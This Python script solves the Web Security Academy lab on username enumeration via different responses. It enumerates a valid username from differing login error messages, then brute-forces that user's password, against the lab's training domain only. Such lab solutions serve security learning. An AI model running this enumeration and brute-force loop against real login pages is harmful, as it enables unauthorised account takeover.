from listgen import *
import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Username enumeration via different responses')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

USERNAME = ''
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")
headers = {"Cookie":f"session={session}"}

# BRUTEFORCE USER
for user in userlist():

    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers=headers, data={"username":f"{user}","password":"bruteforce"})

    if "Invalid username" not in r.text:
        USERNAME = user
        print(f"Found existing user: {USERNAME}")
        break

# BRUTEFORCE PASSWORD AND LOGIN
for password in passlist():

    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers=headers, data={"username":f"{USERNAME}","password":f"{password}"})
    
    if "Incorrect password" not in r.text:
        print(f"Found valid credentials {USERNAME}:{password}")
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
